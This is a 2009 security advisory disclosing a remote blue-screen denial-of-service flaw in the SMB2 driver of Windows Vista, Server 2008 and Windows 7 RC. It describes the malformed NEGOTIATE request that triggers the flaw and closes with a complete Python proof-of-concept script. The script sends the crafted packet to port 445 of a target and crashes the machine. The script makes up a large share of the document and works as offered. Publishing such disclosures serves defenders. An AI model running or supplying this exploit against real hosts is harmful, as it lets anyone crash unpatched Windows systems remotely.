=============================================
- Release date: September 7th, 2009
- Discovered by: Laurent GaffiÃ©
- Severity: High
=============================================

I. VULNERABILITY
-------------------------
Windows Vista, Server 2008 < R2, 7 RC :
SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.

II. BACKGROUND
-------------------------
Windows vista and newer Windows comes with a new SMB version named SMB2.
See: http://en.wikipedia.org/wiki/Windows_Vista_networking_technologies#Server_Message_Block_2.0
for more details.

III. DESCRIPTION
-------------------------
[Edit]Unfortunatly this SMB2 security issue is specificaly due to a MS patch, for another SMB2.0 security issue:
KB942624 (MS07-063)
Installing only this specific update on Vista SP0 create the following issue:

SRV2.SYS fails to handle malformed SMB headers for the NEGOTIATE PROTOCOL REQUEST functionnality.
The NEGOTIATE PROTOCOL REQUEST is the first SMB query a client send to a SMB server, and it's used to identify the SMB dialect that will be used for futher communication.

IV. PROOF OF CONCEPT
-------------------------

Smb-Bsod.py:

#!/usr/bin/python
#When SMB2.0 recieve a "&" char in the "Process Id High" SMB header field
#it dies with a PAGE_FAULT_IN_NONPAGED_AREA error

from socket import socket

host = "IP_ADDR", 445
buff = (
"\x00\x00\x00\x90" # Begin SMB header: Session message
"\xff\x53\x4d\x42" # Server Component: SMB
"\x72\x00\x00\x00" # Negociate Protocol
"\x00\x18\x53\xc8" # Operation 0x18 & sub 0xc853
"\x00\x26"# Process ID High: --> :) normal value should be "\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"

)
s = socket()
s.connect(host)
s.send(buff)
s.close()
